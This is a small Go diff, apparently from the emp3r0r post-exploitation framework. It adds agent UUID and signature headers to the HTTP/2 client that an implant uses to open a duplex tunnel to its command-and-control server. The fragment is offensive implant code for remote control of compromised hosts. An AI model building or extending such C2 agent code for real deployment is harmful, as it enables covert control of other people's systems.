@@ -104,7 +104,12 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
-	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}
+	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient,
+		Header: http.Header{
+			"AgentUUID":    {RuntimeConfig.AgentUUID},
+			"AgentUUIDSig": {RuntimeConfig.AgentUUIDSig},
+		},
+	}
 	log.Printf("ConnectCC: connecting to %s", url)
 	go func() {
 		conn, resp, err = h2.Connect(ctx, url)
